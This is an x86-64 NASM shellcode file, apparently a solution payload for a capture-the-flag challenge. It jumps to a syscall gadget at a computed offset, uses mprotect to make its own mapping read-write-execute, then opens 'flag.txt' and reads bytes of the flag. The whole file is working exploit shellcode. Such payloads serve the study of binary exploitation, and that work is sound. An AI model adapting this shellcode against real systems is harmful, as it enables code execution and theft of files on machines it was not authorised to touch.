BITS 64

; nasm shellcode.asm -o s.bin

start:
	lea r15,[rel start+0x2000-0x100-6] ; adress of the syscall; jmp r12

; mprotect
	mov rax,10
	lea rdi,[rel start-6] ; start of the rx mapping
	mov rsi,0x2000
	mov rdx,7 ; rwx

	lea r12,[rel mprotect_return]
	jmp r15


mprotect_return:
; open
	mov rax,2
	lea rdi,[rel filename]
	mov rsi,0
	mov rdx, 0x1c0

	lea r12,[rel open_return]
	jmp r15


open_return:
; read
	mov rax,0
	mov rdi,0
	mov rdx,5 ; amount of bytes to read into the flag_buf (first 4 bytes are known "CUP{")
	lea rsi,[rel flag_buf]
	
	lea r12,[rel read_return]
	jmp r15


read_return:
	nop
	nop
	nop


filename:
	db 'flag.txt',0


flag_buf:
	db '#!@'
